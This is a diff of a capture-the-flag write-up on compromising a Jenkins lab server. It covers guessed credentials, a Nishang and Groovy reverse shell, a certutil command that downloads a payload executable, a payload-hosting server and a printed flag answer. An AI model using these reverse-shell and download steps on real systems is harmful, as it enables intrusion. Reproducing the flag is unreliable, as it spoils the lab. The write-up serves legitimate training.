@@ -3,7 +3,7 @@ Exploit Jenkins to gain an initial shell, then escalate your privileges by explo
 
 Exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made changes to it). After which, apply methods escalate privilege to get full system access. 
 
-# Task 1 Initial Access:
+## Task 1 Initial Access:
 
 In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made changes to it). After which, we'll use an interesting privilege escalation method to get full system access. 
 
@@ -15,7 +15,6 @@ git clone https://github.com/samratashok/nishang
 
 ### NMAP scan (no ping Pn, ICMP blocked): 
 ```
-
 **nmap -sT -Pn -sC <targetIP>**
 Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-03 17:41 BST
 ...
@@ -33,7 +32,7 @@ PORT     STATE SERVICE
 ```
 
 ---
-## Q1: number of TCP ports:
+### Q1: number of TCP ports:
 Answer: 3
 
 Trying several things, looking at code in url pages, basic gobuster scan of directories, and exiftools not a lot showed up. Only
@@ -49,7 +48,8 @@ acegi refers to Acegi Security, which was the original name of Spring Security, 
 - The app is likely running on Java / Tomcat / JSP.
 - It may be vulnerable depending on how outdated the framework is.
 
-## Q2 What is the username and password for the login panel? (in the format username:password):
+---
+### Q2 What is the username and password for the login panel? (in the format username:password):
 
 Considering the answer expected is *****:*****, with consideration of the names found on the site and common names you would expect with wayne, bruce and admin, were likely expected to be one of options, password I considerd common list i decided not to try a common wordlist as these were enough to guess it. No need for brute force.  
 
@@ -137,8 +137,8 @@ nothing really usable.
 ```
 
 
-
-## Q3: Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: 
+---
+### Q3: Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: 
 
 Answer: not required
 ```
@@ -151,7 +151,7 @@ Answer: no response required.
 This requires the use of Nishang tool kit mentioned earlier. 
 Download, go to shells folder and start a python3 -m http.server to allow download from server end.
 ```
-root@ip-10-49-76-50:~# git clone https://github.com/samratashok/nishang
+~# git clone https://github.com/samratashok/nishang
 Cloning into 'nishang'...
 ...
 ~# cd nishang/Shells
@@ -191,14 +191,14 @@ PS C:\Program Files (x86)\Jenkins\workspace\project> type c:\users\bruce\desktop
 PS C:\Program Files (x86)\Jenkins\workspace\project> 
 
 ```
-
-## Q4 What is the user.txt flag? 
+---
+### Q4 What is the user.txt flag? 
 Answer: 79007a09481963edf2e1321abd9ae2a0
 
 Another alternative was to use the “Manage Jenkins” option and then open the Script Console, where a Groovy script, a language somewhere between Java and Python, which is required by script window. A reverse shell example can be found in online resources, allowing a connection in a more simplified way compared to using the Nishang toolkit. After selecting Run, it will connect back to your netcat listener. I will connect back to a regular windows command line. but can be changed to powershell easy enough if required.
 
 
-# Task 2: Switching shells
+## Task 2 Switching shells
 
 To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.
 
@@ -212,6 +212,7 @@ Next to transfer it, I tried groovy shell in script console in manage jenkins se
 So starters quick reverse shell back in using groovy instead it appears easier, here is one link for a classic groovy reverse shell:
 ```
 groovy shell from googlesearch was same as one found on revshells.com
+```
 https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy
 ```
 Exactly same except String cmd="sh" is String cmd="cmd.exe" and of course change ip and port as normal. Tried cmd="powershell.exe" instead and it just displays 2 lines and fails, groovy seemed easy to crash and definitely did if you tried cmd.exe and typed powershell to jump over to it: 
@@ -222,9 +223,8 @@ Copyright (C) 2009 Microsoft Corporation. All rights reserved.
 ? Becomes unresponsive here
 ```
 
-## Trying upload payload methods here:
+### Trying upload payload methods here:
 
-### Trying to use certutil:
 ```
 certutil.exe -urlcache -split -f http://<targetIP>/shell-name.exe shell-name.exe
 ```
@@ -238,7 +238,7 @@ Should work with either http for 80 and https for 443 to connect to those ports,
 Generated certificate:
 openssl req -new -x509 -keyout key.pem -out cert.pem -days 365 -nodes
 
-then tried to setup server using it, which failed.
+Then tried to setup server using it, which failed.
 
 python3 -m http.server 443 --bind 0.0.0.0 --ssl-key key.pem --ssl-cert cert.pem
 usage: server.py [-h] [--cgi]
@@ -251,7 +251,7 @@ root@ip-10-49-75-238:~/nishang/Shells#
 Process to create a simple server to make TLS work, I tried this and this does not not work as expected. tcpdump -i any port 443 did read packet, but is likely httpd.socket = ssl.wrap_socket drops the packets without error resulting in no sign receiving, likely I did something wrong with the certificate.
 
 ```
-#create simple HTTPS server:
+Create simple python HTTPS server, not the best way to download files from target:
 
 import http.server
 import ssl
